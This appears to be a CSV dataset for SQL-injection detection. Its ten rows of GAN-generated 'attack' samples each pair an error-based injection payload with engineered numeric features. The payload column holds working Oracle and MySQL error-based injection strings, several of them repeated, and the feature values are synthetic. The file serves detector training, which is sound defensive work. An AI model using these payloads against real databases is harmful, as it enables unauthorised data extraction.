id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.278734303417403,292.5838623046875,61.3778190612793,40.98516082763672,115.70201110839844,-1.2408640384674072,91.07074737548828,49.80251693725586,0.7097011208534241,0.2600366175174713,0.17236480116844177,0.41144099831581116,0.13674545288085938,3.60493803024292,0.679848849773407,1.5219395160675049,0.5627732276916504,0.1899127960205078,0.06793000549077988,0.3582197427749634,10.580501556396484,10.894832611083984,2.4710733890533447,0.014882020652294159,1.8931093215942383,0.251718133687973,-0.16664110124111176,-0.09899408370256424,0.08428476750850677,0.6819935441017151,-0.13406485319137573,-0.17091810703277588,1.452575922012329,0.010801788419485092,0.26692065596580505,2.3792564868927,9.970081329345703,1.0938246250152588,1.990439772605896,0.22161763906478882,0.27908608317375183,1.076169490814209,-0.279209166765213,0.03263018652796745,0.46999767422676086,-0.48397281765937805,-0.017384178936481476,0.6089503169059753,0.5370709896087646,0.6601918339729309,0.1638454645872116,0.17303918302059174,-0.20496898889541626,0.2782426178455353,0.1667628437280655,-0.02485824190080166,0.002593633020296693,0.2528880536556244,0.08023981750011444,0.2891315221786499,0.036454468965530396,-0.1254604160785675,-0.28511708974838257,-0.009966667741537094,0.28139159083366394,-0.015911150723695755,0.3357165455818176,0.601070761680603,0.15207011997699738,0.15158230066299438,-0.20921117067337036,-0.1311291605234146,-0.005075916647911072,0.07827405631542206,0.04009929299354553,-0.1687561571598053,1.5634891986846924,0.3563506305217743,-0.21433335542678833,0.059545502066612244,0.26265159249305725,7.910251140594482,0.9652647376060486,0.25283029675483704,-0.0342811681330204,0.4828220009803772,0.06560258567333221,-0.0045645348727703094,-0.08063627034425735
GAN_000002,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,4.931736796418539,281.5778503417969,75.96794128417969,40.50080871582031,110.70343017578125,1.4647761583328247,79.13676452636719,44.116493225097656,0.8987704515457153,0.29312580823898315,0.16542616486549377,0.4069286584854126,0.13582155108451843,3.709024429321289,1.059928059577942,1.0388143062591553,0.5691613554954529,0.0809541717171669,0.07178743928670883,0.14068910479545593,10.866447448730469,10.577408790588379,2.895627975463867,0.12332205474376678,1.9821810722351074,0.12706461548805237,0.06683956831693649,0.1612076461315155,0.04485924914479256,0.5914986729621887,0.02703574299812317,-0.15780439972877502,1.485100269317627,0.006713174283504486,0.32909896969795227,2.1953439712524414,9.28251838684082,1.132215976715088,2.0754218101501465,0.27137491106987,0.3204403221607208,0.8919039368629456,-0.01600155234336853,0.059406500309705734,0.008314251899719238,-0.1140890121459961,-0.15166442096233368,0.49335455894470215,0.4479365944862366,0.5354790091514587,0.3564418852329254,0.34051796793937683,-0.16883312165737152,0.07774024456739426,0.23690219223499298,-0.011292354203760624,0.009184971451759338,-0.15640440583229065,0.15153566002845764,0.22901451587677002,-0.06461858004331589,-0.07974164932966232,-0.017517350614070892,0.012635063380002975,0.17358705401420593,-0.046928755939006805,0.45460695028305054,0.19498199224472046,0.04218368977308273,0.028107620775699615,0.10758427530527115,0.04087404906749725,0.14302486181259155,0.09481100738048553,0.016335809603333473,-0.17088770866394043,1.1705650091171265,0.44055312871932983,-0.07854758203029633,0.053166747093200684,0.22395916283130646,8.228713035583496,0.8066684007644653,0.1591169387102127,0.046109411865472794,0.5933212637901306,0.02610282599925995,0.037885311990976334,-0.021072931587696075
GAN_000003,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,4.997044802349385,282.8227233886719,73.83551788330078,42.56590270996094,104.5732192993164,1.976793646812439,79.7356948852539,45.29412078857422,1.1748324632644653,0.26807671785354614,0.16070695221424103,0.4127040207386017,0.13229893147945404,3.6142804622650146,0.8720273375511169,1.4709315299987793,0.928819477558136,0.1512044370174408,0.04956445470452309,-0.13097621500492096,10.78580379486084,10.538690567016602,2.399209499359131,0.1079522892832756,1.9777787923812866,0.18984656035900116,0.14195340871810913,0.22277477383613586,0.1063503697514534,0.5573166012763977,-0.03848344087600708,-0.03546743839979172,1.7483001947402954,0.12638036906719208,0.332294225692749,2.3718249797821045,8.639026641845703,1.0229682922363281,2.077291250228882,0.10185296833515167,0.3877965807914734,0.8309574723243713,0.1026526540517807,0.05522558465600014,0.12858010828495026,-0.1949348747730255,-0.15839292109012604,0.5290910601615906,0.498879998922348,0.5103062391281128,0.2973931133747101,0.3663349449634552,-0.25666823983192444,0.25472044944763184,0.2100842446088791,0.05805816873908043,0.09633568674325943,0.17502142488956451,-0.17460550367832184,0.16353827714920044,0.03670912981033325,0.10818157345056534,-0.18792873620986938,0.05048881471157074,0.30552318692207336,-0.06585735827684402,0.6461294889450073,-0.02299720048904419,0.11723753064870834,-0.029239043593406677,0.08769659698009491,-0.2611348330974579,-0.036866262555122375,0.03750781714916229,0.018878670409321785,0.10257109999656677,1.1571054458618164,0.39361634850502014,0.01746365800499916,0.06149400770664215,0.13739195466041565,8.033642768859863,0.7359757423400879,0.17265674471855164,0.006848781835287809,0.6530967950820923,-0.032366737723350525,-0.25188887119293213,0.04001624882221222
GAN_000004,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.205578568210993,283.2395324707031,67.3089599609375,39.635467529296875,106.82750701904297,0.2604442238807678,84.92562866210938,48.529720306396484,0.777990460395813,0.26799291372299194,0.17308731377124786,0.40806275606155396,0.13341598212718964,3.666314125061035,0.6818740963935852,1.1786044836044312,0.48360830545425415,0.15631799399852753,0.06227340176701546,0.14796118438243866,11.46010971069336,10.242326736450195,2.283013105392456,0.01144389808177948,1.8780800104141235,0.22870571911334991,-0.053717244416475296,-0.03224346414208412,0.09112846106290817,0.6551045775413513,0.024586960673332214,-0.385564923286438,1.487431287765503,-0.09725025296211243,0.27014705538749695,2.350795030593872,9.802644729614258,1.1099578142166138,2.078702211380005,0.07692402601242065,0.4427616596221924,0.9312747716903687,-0.10515997558832169,0.03828714042901993,0.3133626878261566,-0.43924668431282043,0.016148641705513,0.537666916847229,0.5386767983436584,0.6716686487197876,0.31099963188171387,0.21322986483573914,-0.05549994111061096,0.20160725712776184,0.2157776653766632,-0.0003660480724647641,-0.004440430086106062,0.05436224490404129,0.004703149199485779,0.4471249282360077,-0.0804353803396225,-0.08160234987735748,-0.16525623202323914,0.13202440738677979,0.2558773159980774,0.19187214970588684,0.40847933292388916,0.44382244348526,0.11142642050981522,-0.02066216617822647,-0.16568925976753235,-0.12671111524105072,0.2224445343017578,-0.07418717443943024,0.02319852076470852,-0.20202255249023438,1.3154984712600708,0.3730630874633789,-0.2739064395427704,0.08795784413814545,0.26746323704719543,7.8749680519104,0.996363639831543,0.2220924198627472,0.026430713012814522,0.5945354104042053,0.19013908505439758,-0.09601746499538422,0.0896698385477066
GAN_000005,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,4.864667763428408,285.5624694824219,64.95792388916016,41.75050354003906,112.21224212646484,-0.4177834391593933,88.0759506225586,48.451602935791016,0.8602170944213867,0.25952863693237305,0.1674366146326065,0.40465638041496277,0.13612712919712067,3.68133282661438,1.0505298376083374,1.0649809837341309,0.5687232613563538,0.1267194300889969,0.03821346163749695,0.2849612832069397,10.722640991210938,11.017868041992188,2.7304258346557617,0.0026753470301628113,1.8715476989746094,0.17146342992782593,-0.23196272552013397,0.008247132413089275,0.07267826795578003,0.609154999256134,0.0003553926944732666,-0.26815009117126465,1.5478415489196777,0.12824170291423798,0.301139771938324,2.1534719467163086,9.179523468017578,0.9572766423225403,1.8428398370742798,0.18694643676280975,0.37063175439834595,1.0006327629089355,-0.054561443626880646,0.031085574999451637,0.2722724974155426,-0.1502968966960907,-0.013082250952720642,0.5598435997962952,0.5466452240943909,0.6172343492507935,0.3079858720302582,0.3091598451137543,-0.020737484097480774,-0.05467443913221359,0.1575474739074707,0.0161576047539711,0.012805763632059097,0.20331911742687225,-0.06632528454065323,0.30880972743034363,-0.10123755782842636,0.12781363725662231,-0.06579145044088364,-0.005543287843465805,0.2297227531671524,0.09585514664649963,0.37574952840805054,0.33086904883384705,0.15002858638763428,-0.038177914917469025,-0.24977579712867737,-0.1654122918844223,0.13195811212062836,0.040661849081516266,0.01375364325940609,-0.04824189096689224,1.2927653789520264,0.29078027606010437,-0.16204141080379486,0.07716675847768784,0.21394407749176025,7.901985168457031,0.963055431842804,0.23025889694690704,-0.04936109110713005,0.5423504114151001,0.07377088814973831,0.0644814670085907,-0.02389930933713913
GAN_000006,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,5.272783826497154,296.3316955566406,77.7863540649414,41.599090576171875,110.30883026123047,2.089887857437134,84.35164642333984,49.322654724121094,1.2501811981201172,0.2462303638458252,0.15160265564918518,0.4097152054309845,0.13378958404064178,3.5958006381988525,1.0928277969360352,2.041973352432251,1.0305579900741577,0.08666202425956726,0.05061137676239014,0.10210126638412476,10.979433059692383,10.067801475524902,2.8152873516082764,0.06066446751356125,1.8183588981628418,0.11979636549949646,0.3074091672897339,0.06083429977297783,0.06686220318078995,0.5824898481369019,-0.15583357214927673,0.1133524477481842,1.6720786094665527,0.5213541388511658,0.37264925241470337,2.1726207733154297,7.404380798339844,0.7538635730743408,1.8852546215057373,0.08408686518669128,0.4644588232040405,1.1371155977249146,-0.12915724515914917,0.006526182871311903,0.20874860882759094,-0.17298996448516846,-0.36928677558898926,0.6441973447799683,0.4465806782245636,0.5697406530380249,0.16364960372447968,0.4882858991622925,-0.5016309022903442,0.3204919397830963,0.2026558667421341,0.00975078996270895,0.07362832874059677,0.29783904552459717,0.24021193385124207,0.18079814314842224,-0.12940244376659393,0.4173209071159363,-0.3008545935153961,-0.13966292142868042,0.3176056444644928,-0.11517104506492615,0.5593505501747131,0.1382717788219452,0.3547668159008026,-0.11949048191308975,-0.11411918699741364,-0.4097464680671692,-0.12548565864562988,0.0982702225446701,0.030879070982336998,0.11159636080265045,1.2921994924545288,0.16898658871650696,-0.03254640847444534,-0.10087203234434128,0.06715140491724014,7.479933738708496,0.9068796038627625,0.23401807248592377,-0.1224943995475769,0.6167344450950623,0.01986677572131157,0.07935911417007446,-0.0003708451986312866
GAN_000007,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,5.160569615696396,285.86102294921875,71.79048919677734,40.86434555053711,104.96797943115234,0.46334367990493774,84.42467498779297,47.5164909362793,1.0226064920425415,0.2690260708332062,0.16551557183265686,0.40961548686027527,0.1306096762418747,3.6410598754882812,0.7557015419006348,1.333942174911499,0.6173355579376221,0.13390372693538666,0.03677583858370781,0.02725202962756157,12.475071907043457,10.918941497802734,2.3293533325195312,0.019653551280498505,1.8986235857009888,0.18997915089130402,0.09903574734926224,0.0656590685248375,0.024144230410456657,0.5113866329193115,-0.0590004026889801,-0.08732804656028748,1.5682199001312256,-0.055851761251688004,0.3542864918708801,2.3636085987091064,9.536876678466797,1.1238064765930176,2.157585859298706,0.22811374068260193,0.44260409474372864,0.9919101595878601,-0.1105257049202919,0.03310510516166687,0.29050397872924805,-0.32275378704071045,-0.11697503924369812,0.5113990306854248,0.5174047350883484,0.6294376850128174,0.24428080022335052,0.27646371722221375,-0.18328040838241577,0.23495671153068542,0.23724374175071716,-0.020746832713484764,0.03680869936943054,-0.060537271201610565,0.06656424701213837,0.4377959370613098,0.007139846682548523,0.039812617003917694,-0.14763972163200378,0.00412377342581749,0.3212259113788605,0.09271939098834991,0.544201672077179,0.21885600686073303,0.0235209371894598,-0.17451143264770508,-0.0061906203627586365,-0.13106755912303925,0.09087829291820526,-0.05725695192813873,0.023357324302196503,-0.14080023765563965,1.1897046566009521,0.4215444326400757,-0.19534292817115784,0.05734660103917122,0.20872922241687775,7.86201286315918,0.9048406481742859,0.20569026470184326,0.019929416477680206,0.6139647960662842,0.03520209342241287,-0.14176420867443085,0.15984183549880981
GAN_000008,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.120567825533422,297.6587829589844,64.90460968017578,39.938255310058594,101.7986068725586,-0.2133762389421463,87.42032623291016,52.2833137512207,1.0735516548156738,0.2415037602186203,0.16632631421089172,0.41090843081474304,0.13702392578125,3.6293957233428955,0.9399007558822632,1.598791480064392,0.6789668798446655,0.1895015835762024,0.05917659029364586,-0.03885514289140701,11.350526809692383,9.859336853027344,1.699791431427002,-0.023403175175189972,2.05264949798584,0.22455614805221558,-0.055156879127025604,-0.07606057077646255,0.09031715989112854,0.7781676650047302,0.07069447636604309,-0.1825370341539383,1.433740258216858,0.17625054717063904,0.24870119988918304,2.271630048751831,9.063136100769043,0.6319703459739685,2.082087755203247,0.1988278329372406,0.4101068675518036,0.9845927953720093,0.025750089436769485,0.05227072164416313,0.33879029750823975,-0.28161197900772095,-0.1198834478855133,0.5278161764144897,0.42838770151138306,0.6246092915534973,0.1942862719297409,0.40695762634277344,-0.19444459676742554,0.21216434240341187,0.18810343742370605,-0.0001877854811027646,-0.013606730848550797,0.09730339050292969,0.01926705241203308,0.01797475293278694,-0.04325921833515167,0.22174286842346191,-0.1286834180355072,-0.030073903501033783,0.2507767081260681,-0.09196481108665466,0.5116850137710571,0.4898233413696289,0.11708047240972519,-0.011048495769500732,-0.13583049178123474,-0.10171248763799667,0.1340876817703247,0.26221463084220886,0.027450166642665863,0.12522128224372864,1.2765898704528809,0.18196067214012146,-0.23209261894226074,0.0344475656747818,0.29285532236099243,8.442564010620117,0.9326117038726807,0.19536884129047394,-0.013319467194378376,0.6047122478485107,0.14069879055023193,0.26803332567214966,-0.11891600489616394
GAN_000009,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.023760729130914,293.3285827636719,62.914127349853516,42.47316360473633,111.20150756835938,1.4451349973678589,91.99971008300781,49.94252014160156,0.7669039964675903,0.25265806913375854,0.1584220677614212,0.4040954113006592,0.13550491631031036,3.6331872940063477,0.7842074632644653,1.2641736268997192,0.6394532322883606,0.12137727439403534,0.048997797071933746,0.043118275701999664,12.024256706237793,11.325621604919434,2.339000940322876,0.10342566668987274,1.9324352741241455,0.23939062654972076,-0.14580729603767395,-0.11137212067842484,0.062200430780649185,0.7459154725074768,-0.19774764776229858,-0.27616554498672485,1.4563755989074707,-0.037240322679281235,0.25884684920310974,2.4236719608306885,9.778114318847656,1.009248971939087,1.910141110420227,0.0037159209605306387,0.49634748697280884,1.1038542985916138,-0.15083172917366028,0.016829300671815872,0.5077792406082153,-0.2351013720035553,-0.17681662738323212,0.5989357233047485,0.5651304125785828,0.7063555717468262,0.2224012166261673,0.2950334846973419,-0.14649884402751923,0.3238241374492645,0.25528156757354736,-0.019479429349303246,-0.017398986965417862,0.08665935695171356,0.1404952108860016,0.4002425968647003,0.16313183307647705,0.15828216075897217,-0.21951404213905334,-0.06811904907226562,0.2589538097381592,0.1386071890592575,0.3174276351928711,0.43395161628723145,0.16211222112178802,-0.007022038102149963,-0.46545732021331787,-0.052709776908159256,0.13943549990653992,-0.021724775433540344,0.022177554666996002,-0.13847467303276062,1.3762221336364746,0.24896416068077087,-0.16960498690605164,0.0007133623585104942,0.20163148641586304,8.22847843170166,1.0202744007110596,0.25456419587135315,-0.03850835934281349,0.501891016960144,-0.010278189554810524,0.17228743433952332,0.3049347996711731
GAN_000010,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.097929020482951,281.521728515625,66.90858459472656,40.858951568603516,113.84723663330078,0.04604988172650337,86.30621337890625,51.491119384765625,0.8996403217315674,0.2547398805618286,0.16605167090892792,0.4045547544956207,0.1378980576992035,3.611140489578247,1.0403711795806885,1.2865761518478394,0.6771700978279114,0.18789087235927582,0.034843575209379196,0.30894193053245544,10.791729927062988,10.692750930786133,2.6808760166168213,0.07968907058238983,1.885988473892212,0.21580873429775238,-0.2437034696340561,-0.03620368614792824,-0.00415365444496274,0.7104564905166626,-0.2357022762298584,-0.12289432436227798,1.5047283172607422,0.11222627758979797,0.33851158618927,2.259329080581665,9.528372764587402,0.7983002066612244,1.961388349533081,0.1552470624446869,0.34762778878211975,1.0983915328979492,-0.11184517294168472,0.026248695328831673,0.4289598762989044,-0.1866438388824463,-0.10227549076080322,0.5229648351669312,0.48509085178375244,0.5894383192062378,0.11440758407115936,0.3308549225330353,0.02445850893855095,0.16339054703712463,0.18391048908233643,-0.024194812402129173,0.0206279456615448,0.07816588878631592,0.08964760601520538,0.16020146012306213,0.046889111399650574,-0.04800376668572426,-0.22977939248085022,0.09475620836019516,0.23292411863803864,-0.004043944180011749,0.4213027060031891,0.3447141945362091,0.19268231093883514,0.07809239625930786,-0.26626482605934143,-0.1337622106075287,-0.0007297024130821228,0.2443361133337021,0.019687319174408913,-0.02281928062438965,1.4839619398117065,0.27147841453552246,-0.23791128396987915,0.024963995441794395,0.253237783908844,8.487985610961914,0.9361338019371033,0.22021815180778503,-0.05287948623299599,0.5619081258773804,-0.04335291311144829,0.2644394636154175,-0.1124911978840828
